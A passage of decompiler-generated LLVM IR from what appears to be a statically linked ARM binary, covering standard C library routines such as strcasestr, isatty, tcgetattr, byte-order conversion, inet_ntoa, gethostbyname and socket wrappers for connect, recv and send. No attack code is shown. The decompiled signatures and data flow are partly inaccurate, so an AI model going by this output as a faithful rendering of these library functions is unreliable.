  store i32 %v0_12078, i32* @r4, align 4
  %tmp = icmp ugt i32 %v0_12064, 124
  br i1 %tmp, label %dec_label_pc_120b0, label %dec_label_pc_12080

dec_label_pc_12080:                               ; preds = %entry
  br label %dec_label_pc_12098

dec_label_pc_1208c:                               ; preds = %dec_label_pc_12098
  br i1 %v2_120a4, label %bb, label %bb15

bb:                                               ; preds = %dec_label_pc_1208c
  %v2_12090 = add i32 %v1_120a8, -1
  br label %bb15

bb15:                                             ; preds = %dec_label_pc_1208c, %bb
  %v0_120981 = phi i32 [ %v1_120a8, %dec_label_pc_1208c ], [ %v2_12090, %bb ]
  %v1_12094 = add i32 %v0_12094, 1
  br label %dec_label_pc_12098

dec_label_pc_12098:                               ; preds = %dec_label_pc_12080, %bb15
  %v1_120a8 = phi i32 [ %v0_12064, %dec_label_pc_12080 ], [ %v0_120981, %bb15 ]
  %v0_12094 = phi i32 [ add (i32 ptrtoint (i32* @global_var_26934.581 to i32), i32 -36876), %dec_label_pc_12080 ], [ %v1_12094, %bb15 ]
  store i32 %v0_12094, i32* @r5, align 4
  %v2_12098 = icmp eq i32 %v1_120a8, 0
  %v1_1209c = inttoptr i32 %v0_12094 to i8*
  %v2_1209c = load i8, i8* %v1_1209c, align 1
  %v3_1209c = zext i8 %v2_1209c to i32
  store i32 %v3_1209c, i32* @r3, align 4
  %v2_120a4 = icmp eq i8 %v2_1209c, 0
  br i1 %v2_12098, label %dec_label_pc_120a4, label %dec_label_pc_1208c

dec_label_pc_120a4:                               ; preds = %dec_label_pc_12098
  br i1 %v2_120a4, label %dec_label_pc_120b0, label %bb16

bb16:                                             ; preds = %dec_label_pc_120a4
  store i32 0, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_120ec

dec_label_pc_120b0:                               ; preds = %dec_label_pc_120a4, %entry
  store i32 %v0_12064, i32* @r2, align 4
  %v3_120b8 = ashr i32 %v0_12064, 31
  store i32 %v3_120b8, i32* @r3, align 4
  %v6_120cc = bitcast i32* %stack_var_-25 to i8*
  %v7_120cc = call i32 @_uintmaxtostr(i8* %v6_120cc)
  %v1_120d4 = add i32 %v7_120cc, -14
  store i32 %v1_120d4, i32* @r5, align 4
  %v0_120d8 = load i32, i32* @r6, align 4
  %v2_120d8 = add i32 %v0_120d8, -36892
  store i32 %v2_120d8, i32* @r1, align 4
  store i32 %v1_120d4, i32* @r0, align 4
  store i32 14, i32* @r2, align 4
  %v0_120e4 = call i32 @memcpy()
  store i32 22, i32* %r6.global-to-local, align 4
  %v0_120ec.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_120ec

dec_label_pc_120ec:                               ; preds = %bb16, %dec_label_pc_120b0
  %v0_120ec = phi i32 [ %v0_12094, %bb16 ], [ %v0_120ec.pre, %dec_label_pc_120b0 ]
  %v1_120ec = inttoptr i32 %v0_120ec to i8*
  %v3_120f0 = call i32 @strlen(i8* %v1_120ec)
  %v0_120f4 = load i32, i32* @r7, align 4
  %v2_120f4 = icmp eq i32 %v0_120f4, 0
  br i1 %v2_120f4, label %bb17, label %dec_label_pc_120ec._crit_edge

dec_label_pc_120ec._crit_edge:                    ; preds = %dec_label_pc_120ec
  %v1_12100.pre = load i32, i32* @r4, align 4
  br label %bb18

bb17:                                             ; preds = %dec_label_pc_120ec
  store i32 0, i32* @r4, align 4
  br label %bb18

bb18:                                             ; preds = %dec_label_pc_120ec._crit_edge, %bb17
  %v1_12100 = phi i32 [ %v1_12100.pre, %dec_label_pc_120ec._crit_edge ], [ 0, %bb17 ]
  %v1_120fc = add i32 %v3_120f0, 1
  %v3_12100 = icmp uge i32 %v1_120fc, %v1_12100
  %v9_12100 = icmp eq i32 %v1_120fc, %v1_12100
  %v2_12104 = xor i1 %v3_12100, true
  %v3_12104 = or i1 %v9_12100, %v2_12104
  br i1 %v3_12104, label %bb19, label %bb20

bb19:                                             ; preds = %bb18
  store i32 %v1_120fc, i32* @r4, align 4
  br label %bb20

bb20:                                             ; preds = %bb18, %bb19
  %v0_12114 = phi i32 [ %v1_12100, %bb18 ], [ %v1_120fc, %bb19 ]
  %v2_12108 = xor i1 %v9_12100, true
  %v3_12108 = and i1 %v3_12100, %v2_12108
  br i1 %v3_12108, label %bb21, label %bb22

bb21:                                             ; preds = %bb20
  store i32 34, i32* %r6.global-to-local, align 4
  br label %bb22

bb22:                                             ; preds = %bb20, %bb21
  %v2_1210c = icmp eq i32 %v0_12114, 0
  br i1 %v2_1210c, label %dec_label_pc_12130, label %dec_label_pc_12114

dec_label_pc_12114:                               ; preds = %bb22
  store i32 %v0_12114, i32* @r2, align 4
  %v0_12118 = load i32, i32* @r5, align 4
  store i32 %v0_12118, i32* @r1, align 4
  store i32 %v0_120f4, i32* @r0, align 4
  %v0_12120 = call i32 @memcpy()
  %v0_12124 = load i32, i32* @r4, align 4
  %v1_12124 = load i32, i32* @r7, align 4
  %v2_12124 = add i32 %v1_12124, %v0_12124
  %v3_1212c = add i32 %v2_12124, -1
  %v4_1212c = inttoptr i32 %v3_1212c to i8*
  store i8 0, i8* %v4_1212c, align 1
  br label %dec_label_pc_12130

dec_label_pc_12130:                               ; preds = %bb22, %dec_label_pc_12114
  %v0_12130 = load i32, i32* %r6.global-to-local, align 4
  %v2_12130 = icmp eq i32 %v0_12130, 0
  br i1 %v2_12130, label %dec_label_pc_12140, label %dec_label_pc_12138

dec_label_pc_12138:                               ; preds = %dec_label_pc_12130
  %v0_12138 = call i32 @__GI___errno_location()
  %v0_1213c = load i32, i32* %r6.global-to-local, align 4
  %v2_1213c = inttoptr i32 %v0_12138 to i32*
  store i32 %v0_1213c, i32* %v2_1213c, align 4
  %v0_12140.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_12140

dec_label_pc_12140:                               ; preds = %dec_label_pc_12130, %dec_label_pc_12138
  %v0_12140 = phi i32 [ 0, %dec_label_pc_12130 ], [ %v0_12140.pre, %dec_label_pc_12138 ]
  store i32 %v3_1205c, i32* @r4, align 4
  store i32 %v9_1205c, i32* %r6.global-to-local, align 4
  ret i32 %v0_12140

; uselistorder directives
  uselistorder i1 %v3_12100, { 1, 0 }
  uselistorder i32 %v0_12094, { 0, 2, 3, 1 }
  uselistorder i32 %v1_120a8, { 1, 0, 2 }
  uselistorder i32 %v0_12064, { 2, 1, 3, 0, 4 }
  uselistorder i32* %r6.global-to-local, { 0, 5, 3, 4, 1, 2, 6 }
  uselistorder label %dec_label_pc_12140, { 1, 0 }
  uselistorder label %dec_label_pc_12130, { 1, 0 }
  uselistorder label %bb22, { 1, 0 }
  uselistorder label %bb20, { 1, 0 }
  uselistorder label %bb18, { 1, 0 }
  uselistorder label %dec_label_pc_120ec, { 1, 0 }
  uselistorder label %dec_label_pc_12098, { 1, 0 }
  uselistorder label %bb15, { 1, 0 }
}

define i32 @strcasestr(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v0_12168 = load i32, i32* %r0.global-to-local, align 4
  %v1_1217c23 = inttoptr i32 %arg2 to i8*
  br label %dec_label_pc_1217c.outer

dec_label_pc_1217c.outer:                         ; preds = %dec_label_pc_121bc, %entry
  %v0_121bc.ph = phi i32 [ %v1_121bc, %dec_label_pc_121bc ], [ %v0_12168, %entry ]
  %v2_1217c24 = load i8, i8* %v1_1217c23, align 1
  %v2_1218026 = icmp eq i8 %v2_1217c24, 0
  br i1 %v2_1218026, label %bb, label %dec_label_pc_12194

bb:                                               ; preds = %dec_label_pc_1217c.backedge, %dec_label_pc_1217c.outer
  store i32 %v0_121bc.ph, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_121d0

dec_label_pc_12194:                               ; preds = %dec_label_pc_1217c.outer, %dec_label_pc_1217c.backedge
  %v1_1218832.in = phi i32 [ %v1_1218832, %dec_label_pc_1217c.backedge ], [ %arg2, %dec_label_pc_1217c.outer ]
  %v2_1217c30 = phi i8 [ %v2_1217c, %dec_label_pc_1217c.backedge ], [ %v2_1217c24, %dec_label_pc_1217c.outer ]
  %v2_1218431.in.in = phi i8 [ %v2_1217c, %dec_label_pc_1217c.backedge ], [ %v2_1217c24, %dec_label_pc_1217c.outer ]
  %v0_121a029 = phi i32 [ %v1_121a0, %dec_label_pc_1217c.backedge ], [ %v0_121bc.ph, %dec_label_pc_1217c.outer ]
  %v1_1218832 = add i32 %v1_1218832.in, 1
  %v1_12194 = inttoptr i32 %v0_121a029 to i8*
  %v2_12194 = load i8, i8* %v1_12194, align 1
  %v3_12194 = zext i8 %v2_12194 to i32
  store i32 %v3_12194, i32* %r0.global-to-local, align 4
  %v9_12198 = icmp eq i8 %v2_1217c30, %v2_12194
  %v1_121a0 = add i32 %v0_121a029, 1
  br i1 %v9_12198, label %dec_label_pc_1217c.backedge, label %dec_label_pc_121a8

dec_label_pc_1217c.backedge:                      ; preds = %dec_label_pc_12194, %dec_label_pc_121a8
  %v1_1217c = inttoptr i32 %v1_1218832 to i8*
  %v2_1217c = load i8, i8* %v1_1217c, align 1
  %v2_12180 = icmp eq i8 %v2_1217c, 0
  br i1 %v2_12180, label %bb, label %dec_label_pc_12194

dec_label_pc_121a8:                               ; preds = %dec_label_pc_12194
  %v2_1218431.in = zext i8 %v2_1218431.in.in to i32
  %v2_1219c = mul nuw nsw i32 %v3_12194, 2
  %v2_1218431 = mul nuw nsw i32 %v2_1218431.in, 2
  %v4_121a8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_26934.581 to i32), i32 2416) to i32*), align 4
  %v2_121ac = add i32 %v4_121a8, %v2_1219c
  %v3_121ac = inttoptr i32 %v2_121ac to i16*
  %v4_121ac = load i16, i16* %v3_121ac, align 2
  %v2_121b0 = add i32 %v4_121a8, %v2_1218431
  %v3_121b0 = inttoptr i32 %v2_121b0 to i16*
  %v4_121b0 = load i16, i16* %v3_121b0, align 2
  %v9_121b4 = icmp eq i16 %v4_121b0, %v4_121ac
  br i1 %v9_121b4, label %dec_label_pc_1217c.backedge, label %dec_label_pc_121bc

dec_label_pc_121bc:                               ; preds = %dec_label_pc_121a8
  %v1_121bc = add i32 %v0_121bc.ph, 1
  %v2_121c0 = icmp eq i8 %v2_12194, 0
  br i1 %v2_121c0, label %dec_label_pc_121d0, label %dec_label_pc_1217c.outer

dec_label_pc_121d0:                               ; preds = %dec_label_pc_121bc, %bb
  %v1_121d4 = phi i32 [ %v0_121bc.ph, %bb ], [ 0, %dec_label_pc_121bc ]
  ret i32 %v1_121d4

; uselistorder directives
  uselistorder i8 %v2_1217c, { 2, 1, 0 }
  uselistorder i32 %v0_121a029, { 1, 0 }
  uselistorder i32 %v0_121bc.ph, { 2, 3, 0, 1 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_1217c.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_12194, { 1, 0 }
}

define i32 @isatty(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-68 = alloca i32, align 4
  %v2_121e8 = ptrtoint i32* %stack_var_-68 to i32
  store i32 %v2_121e8, i32* @r1, align 4
  %v0_121ec = call i32 @__GI_tcgetattr()
  %v1_121f0 = sub i32 1, %v0_121ec
  %v2_121f0 = icmp ult i32 %v0_121ec, 2
  br i1 %v2_121f0, label %bb5, label %bb

bb:                                               ; preds = %entry
  br label %bb5

bb5:                                              ; preds = %entry, %bb
  %v1_12200 = phi i32 [ %v1_121f0, %entry ], [ 0, %bb ]
  ret i32 %v1_12200

; uselistorder directives
  uselistorder i32 %v0_121ec, { 1, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @__GI_tcgetattr() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %tmp = call i8 @__decompiler_undefined_function_3()
  %stack_var_-35 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %v3_12204 = load i32, i32* @r4, align 4
  %v6_12204 = load i32, i32* @r5, align 4
  %v2_1220c = ptrtoint i32* %stack_var_-52 to i32
  %v0_12210 = load i32, i32* @r1, align 4
  store i32 %v0_12210, i32* @r4, align 4
  store i32 21505, i32* %r1.global-to-local, align 4
  %v0_1221c = load i32, i32* @r0, align 4
  %v3_1221c = call i32 @ioctl(i32 %v0_1221c, i32 21505, i32 %v2_1220c)
  store i32 %v3_1221c, i32* %r0.global-to-local, align 4
  store i32 %v3_1221c, i32* @r5, align 4
  %v2_12220 = icmp eq i32 %v3_1221c, 0
  br i1 %v2_12220, label %dec_label_pc_12228, label %dec_label_pc_1226c

dec_label_pc_12228:                               ; preds = %entry
  %v4_12234 = zext i8 %tmp to i32
  store i32 %v4_12234, i32* @ip, align 4
  %v3_12238 = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_12238, i32* @r3, align 4
  %v1_1223c = load i32, i32* @r4, align 4
  %v2_1223c = add i32 %v1_1223c, 4
  %v3_1223c = inttoptr i32 %v2_1223c to i32*
  %v0_12240 = load i32, i32* %r1.global-to-local, align 4
  %v1_12240 = load i32, i32* @r4, align 4
  %v2_12240 = add i32 %v1_12240, 8
  %v3_12240 = inttoptr i32 %v2_12240 to i32*
  store i32 %v0_12240, i32* %v3_12240, align 4
  %v0_12244 = load i32, i32* %r0.global-to-local, align 4
  %v1_12244 = load i32, i32* @r4, align 4
  %v2_12244 = add i32 %v1_12244, 12
  %v3_12244 = inttoptr i32 %v2_12244 to i32*
  store i32 %v0_12244, i32* %v3_12244, align 4
  %v2_12248 = ptrtoint i32* %stack_var_-35 to i32
  store i32 %v2_12248, i32* @r1, align 4
  %v1_12250 = load i32, i32* @r4, align 4
  %v2_12250 = inttoptr i32 %v1_12250 to i32*
  store i32 %v3_12238, i32* %v2_12250, align 4
  %v0_12254 = load i32, i32* @ip, align 4
  %v1_12254 = trunc i32 %v0_12254 to i8
  %v2_12254 = load i32, i32* @r4, align 4
  %v3_12254 = add i32 %v2_12254, 16
  %v4_12254 = inttoptr i32 %v3_12254 to i8*
  store i8 %v1_12254, i8* %v4_12254, align 1
  %v0_12258 = load i32, i32* @r4, align 4
  %v1_12258 = add i32 %v0_12258, 17
  store i32 %v1_12258, i32* %r0.global-to-local, align 4
  %v4_1225c = call i32 @__GI_mempcpy(i32 %v1_12258, i32 %v2_12248, i32 19, i32 %v3_12238)
  store i32 %v4_1225c, i32* %r0.global-to-local, align 4
  %v0_12260 = load i32, i32* @r5, align 4
  store i32 %v0_12260, i32* %r1.global-to-local, align 4
  store i32 13, i32* @r2, align 4
  %v2_12268 = inttoptr i32 %v4_1225c to i8*
  %v3_12268 = call i32 @__GI_memset(i8* %v2_12268, i32 %v0_12260)
  store i32 %v3_12268, i32* %r0.global-to-local, align 4
  %v0_1226c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1226c

dec_label_pc_1226c:                               ; preds = %entry, %dec_label_pc_12228
  %v0_1226c = phi i32 [ %v3_1221c, %entry ], [ %v0_1226c.pre, %dec_label_pc_12228 ]
  store i32 %v0_1226c, i32* %r0.global-to-local, align 4
  store i32 %v3_12204, i32* @r4, align 4
  store i32 %v6_12204, i32* @r5, align 4
  ret i32 %v0_1226c

; uselistorder directives
  uselistorder i32 %v0_1226c, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 4, 2, 3, 5 }
  uselistorder label %dec_label_pc_1226c, { 1, 0 }
}

define i32 @__GI_htons(i32 %arg1) local_unnamed_addr {
entry:
  %v3_12280 = udiv i32 %arg1, 256
  %v1_12284 = mul i32 %arg1, 256
  %v4_12288 = and i32 %v1_12284, 65280
  %v5_12288 = or i32 %v4_12288, %v3_12280
  ret i32 %v5_12288
}

define i32 @__GI_htonl(i32 %arg1) local_unnamed_addr {
entry:
  %v5_122a8 = call i32 @llvm.bswap.i32(i32 %arg1)
  ret i32 %v5_122a8
}

define i32 @__GI_ntohs(i32 %arg1) local_unnamed_addr {
entry:
  %v3_122b0 = udiv i32 %arg1, 256
  %v1_122b4 = mul i32 %arg1, 256
  %v4_122b8 = and i32 %v1_122b4, 65280
  %v5_122b8 = or i32 %v4_122b8, %v3_122b0
  ret i32 %v5_122b8
}

define i32 @__GI_ntohl(i32 %arg1) local_unnamed_addr {
entry:
  %v5_122d8 = call i32 @llvm.bswap.i32(i32 %arg1)
  ret i32 %v5_122d8
}

define i32 @__GI_inet_ntoa_r() local_unnamed_addr {
entry:
  %v3_122e0 = load i32, i32* @r4, align 4
  %v6_122e0 = load i32, i32* @r5, align 4
  %v9_122e0 = load i32, i32* @r6, align 4
  %v12_122e0 = load i32, i32* @r7, align 4
  %v15_122e0 = load i32, i32* @r8, align 4
  %v18_122e0 = load i32, i32* @sb, align 4
  %v21_122e0 = load i32, i32* @sl, align 4
  %v24_122e0 = load i32, i32* @fp, align 4
  %v0_122e4 = load i32, i32* @r0, align 4
  %v5_12300 = call i32 @llvm.bswap.i32(i32 %v0_122e4)
  %v0_12304 = load i32, i32* @r1, align 4
  %v1_12304 = add i32 %v0_12304, 15
  store i32 %v1_12304, i32* @r1, align 4
  store i32 0, i32* @r6, align 4
  store i32 255, i32* @r7, align 4
  store i32 46, i32* @sl, align 4
  br label %dec_label_pc_12340

dec_label_pc_12324:                               ; preds = %dec_label_pc_12340
  %v1_1232c = inttoptr i32 %v0_1235c to i8*
  %v2_1232c = call i32 @_uintmaxtostr(i8* %v1_1232c)
  %v0_12330 = load i32, i32* @r6, align 4
  %v2_12330 = icmp eq i32 %v0_12330, 0
  %v1_12334 = add i32 %v2_1232c, -1
  store i32 %v1_12334, i32* @r1, align 4
  br i1 %v2_12330, label %bb17, label %bb

bb:                                               ; preds = %dec_label_pc_12324
  %v1_12338 = load i32, i32* @sl, align 4
  %v2_12338 = trunc i32 %v1_12338 to i8
  %v4_12338 = inttoptr i32 %v0_12330 to i8*
  store i8 %v2_12338, i8* %v4_12338, align 1
  %v0_1233c.pre = load i32, i32* @r1, align 4
  br label %bb17

bb17:                                             ; preds = %dec_label_pc_12324, %bb
  %v0_1233c = phi i32 [ %v1_12334, %dec_label_pc_12324 ], [ %v0_1233c.pre, %bb ]
  store i32 %v0_1233c, i32* @r6, align 4
  %v0_12340.pre = load i32, i32* @r5, align 4
  %v0_12344.pre = load i32, i32* @r7, align 4
  %v1_12344.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_12340

dec_label_pc_12340:                               ; preds = %entry, %bb17
  %v0_1235c = phi i32 [ %v1_12304, %entry ], [ %v0_1233c, %bb17 ]
  %v1_12344 = phi i32 [ %v5_12300, %entry ], [ %v1_12344.pre, %bb17 ]
  %v0_12344 = phi i32 [ 255, %entry ], [ %v0_12344.pre, %bb17 ]
  %v0_12354 = phi i32 [ 0, %entry ], [ %v0_12340.pre, %bb17 ]
  %v7_12340 = icmp eq i32 %v0_12354, 3
  store i1 %v7_12340, i1* @cpsr_z, align 1
  %v2_12344 = and i32 %v0_12344, %v1_12344
  store i32 %v2_12344, i32* @r2, align 4
  store i32 0, i32* @r3, align 4
  %v3_12350 = udiv i32 %v1_12344, 256
  store i32 %v3_12350, i32* @r4, align 4
  %v1_12354 = add i32 %v0_12354, 1
  store i32 %v1_12354, i32* @r5, align 4
  %v7_12358 = icmp sgt i32 %v0_12354, 3
  br i1 %v7_12358, label %dec_label_pc_1235c, label %dec_label_pc_12324

dec_label_pc_1235c:                               ; preds = %dec_label_pc_12340
  %v1_1235c = add i32 %v0_1235c, 1
  store i32 %v3_122e0, i32* @r4, align 4
  store i32 %v6_122e0, i32* @r5, align 4
  store i32 %v9_122e0, i32* @r6, align 4
  store i32 %v12_122e0, i32* @r7, align 4
  store i32 %v15_122e0, i32* @r8, align 4
  store i32 %v18_122e0, i32* @sb, align 4
  store i32 %v21_122e0, i32* @sl, align 4
  store i32 %v24_122e0, i32* @fp, align 4
  ret i32 %v1_1235c

; uselistorder directives
  uselistorder i32 %v0_12354, { 2, 0, 1 }
  uselistorder i32 %v0_1233c, { 1, 0 }
  uselistorder i32 (i8*)* @_uintmaxtostr, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12340, { 1, 0 }
  uselistorder label %bb17, { 1, 0 }
}

define i32 @__GI_inet_ntoa(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_26934.581 to i32), i32 27100), i32* @r1, align 4
  %v0_1237c = call i32 @__GI_inet_ntoa_r()
  store i32 %v0_1237c, i32* %r0.global-to-local, align 4
  %v0_12380 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_12380, label %bb, label %.thread

bb:                                               ; preds = %entry
  %v1_12380 = load i32, i32* @r4, align 4
  %v2_12380 = trunc i32 %v1_12380 to i16
  %v3_12380 = load i32, i32* @r1, align 4
  %v4_12380 = inttoptr i32 %v3_12380 to i16*
  store i16 %v2_12380, i16* %v4_12380, align 2
  %v1_12384 = load i32, i32* %r0.global-to-local, align 4
  %v2_12384 = inttoptr i32 %v1_12384 to i64*
  %v3_12384 = load i64, i64* %v2_12384, align 4
  %v4_12384 = load i32, i32* @ip, align 4
  %v5_12384 = trunc i64 %v3_12384 to i32
  %v6_12384 = udiv i64 %v3_12384, 4294967296
  %v7_12384 = trunc i64 %v6_12384 to i32
  store i32 %v7_12384, i32* @r6, align 4
  store i32 %v5_12384, i32* @r7, align 4
  %v9_12384 = sub i32 %v1_12384, %v4_12384
  store i32 %v9_12384, i32* %r0.global-to-local, align 4
  br label %.thread

.thread:                                          ; preds = %entry, %bb
  %v10_12384 = phi i32 [ %v0_1237c, %entry ], [ %v9_12384, %bb ]
  ret i32 %v10_12384

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @inet_addr(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v2_12390 = ptrtoint i32* %stack_var_-12 to i32
  %v0_12394 = load i32, i32* @r0, align 4
  %v2_12394 = inttoptr i32 %v0_12394 to i8*
  %v3_12394 = call i32 @inet_aton(i8* %v2_12394, i32 %v2_12390)
  %v2_12398 = icmp eq i32 %v3_12394, 0
  %v4_1239c = load i32, i32* %stack_var_-12, align 4
  %storemerge = select i1 %v2_12398, i32 -1, i32 %v4_1239c
  ret i32 %storemerge
}

define i32 @__GI_gethostbyname(i32 %arg1) local_unnamed_addr {
entry:
  store i32 2, i32* @r1, align 4
  %v0_123bc = call i32 @__GI_gethostbyname2()
  ret i32 %v0_123bc
}

define i32 @__GI_gethostbyname2() local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %v3_123cc = load i32, i32* @r4, align 4
  %v6_123cc = load i32, i32* @r5, align 4
  %v0_123d4 = load i32, i32* @r0, align 4
  store i32 %v0_123d4, i32* @r4, align 4
  %v0_123d8 = load i32, i32* @r1, align 4
  store i32 %v0_123d8, i32* @r5, align 4
  %v0_123dc = call i32 @__GI___h_errno_location()
  %v0_12404 = load i32, i32* @r4, align 4
  %v2_12408 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_12408, i32* @ip, align 4
  %v0_1240c = load i32, i32* @r5, align 4
  %v8_12414 = call i32 @gethostbyname2_r(i32 %v0_12404, i32 %v0_1240c, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_26934.581 to i32), i32 27556) to i32*), i32 add (i32 ptrtoint (i32* @global_var_26934.581 to i32), i32 27116), i32 440, i32 %v2_12408, i32 %v0_123dc)
  %v3_12418 = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_123cc, i32* @r4, align 4
  store i32 %v6_123cc, i32* @r5, align 4
  ret i32 %v3_12418
}

define i32 @function_1242c(i32 %arg1) local_unnamed_addr {
dec_label_pc_1242c:
  %v0_1242c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1242c, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_1242c
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_1242c, %bb
  ret i32 %arg1

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__libc_connect(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_12434 = load i32, i32* @r7, align 4
  store i32 %v3_12434, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_1245c, label %dec_label_pc_1244c

dec_label_pc_1244c:                               ; preds = %entry
  %v0_1244c = call i32 @__GI___errno_location()
  %v0_12450 = load i32, i32* %r7.global-to-local, align 4
  %v1_12450 = sub i32 0, %v0_12450
  %v2_12454 = inttoptr i32 %v0_1244c to i32*
  store i32 %v1_12450, i32* %v2_12454, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_12460.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_1245c

dec_label_pc_1245c:                               ; preds = %entry, %dec_label_pc_1244c
  %v2_12460 = phi i32 [ %v3_12434, %entry ], [ %v2_12460.pre, %dec_label_pc_1244c ]
  %v0_1245c = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_1244c ]
  store i32 %v2_12460, i32* @r7, align 4
  ret i32 %v0_1245c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1245c, { 1, 0 }
}

define i32 @__GI_getsockname(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1246c = load i32, i32* @r7, align 4
  store i32 %v3_1246c, i32* %stack_var_-8, align 4
  %v0_12478 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_12478, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_12478, -4095
  br i1 %tmp, label %dec_label_pc_12498, label %dec_label_pc_12488

dec_label_pc_12488:                               ; preds = %entry
  %v0_12488 = call i32 @__GI___errno_location()
  %v0_1248c = load i32, i32* %r7.global-to-local, align 4
  %v1_1248c = sub i32 0, %v0_1248c
  %v2_12490 = inttoptr i32 %v0_12488 to i32*
  store i32 %v1_1248c, i32* %v2_12490, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_12498.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_12498

dec_label_pc_12498:                               ; preds = %entry, %dec_label_pc_12488
  %v1_1249c = phi i32 [ %v0_12478, %entry ], [ -1, %dec_label_pc_12488 ]
  %v2_12498 = phi i32 [ %v3_1246c, %entry ], [ %v2_12498.pre, %dec_label_pc_12488 ]
  store i32 %v2_12498, i32* @r7, align 4
  ret i32 %v1_1249c

; uselistorder directives
  uselistorder i32 %v0_12478, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12498, { 1, 0 }
}

define i32 @getsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_124d8, label %dec_label_pc_124c8

dec_label_pc_124c8:                               ; preds = %entry
  %v0_124c8 = call i32 @__GI___errno_location()
  %v0_124cc = load i32, i32* %r4.global-to-local, align 4
  %v1_124cc = sub i32 0, %v0_124cc
  %v2_124d0 = inttoptr i32 %v0_124c8 to i32*
  store i32 %v1_124cc, i32* %v2_124d0, align 4
  br label %dec_label_pc_124d8

dec_label_pc_124d8:                               ; preds = %entry, %dec_label_pc_124c8
  %v1_124e0 = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_124c8 ]
  ret i32 %v1_124e0

; uselistorder directives
  uselistorder i32 %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_124d8, { 1, 0 }
}

define i32 @__libc_recv(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_124e8 = load i32, i32* @r7, align 4
  store i32 %v3_124e8, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_12510, label %dec_label_pc_12500

dec_label_pc_12500:                               ; preds = %entry
  %v0_12500 = call i32 @__GI___errno_location()
  %v0_12504 = load i32, i32* %r7.global-to-local, align 4
  %v1_12504 = sub i32 0, %v0_12504
  %v2_12508 = inttoptr i32 %v0_12500 to i32*
  store i32 %v1_12504, i32* %v2_12508, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_12514.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_12510

dec_label_pc_12510:                               ; preds = %entry, %dec_label_pc_12500
  %v2_12514 = phi i32 [ %v3_124e8, %entry ], [ %v2_12514.pre, %dec_label_pc_12500 ]
  %v0_12510 = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_12500 ]
  store i32 %v2_12514, i32* @r7, align 4
  ret i32 %v0_12510

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12510, { 1, 0 }
}

define i32 @__libc_send(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
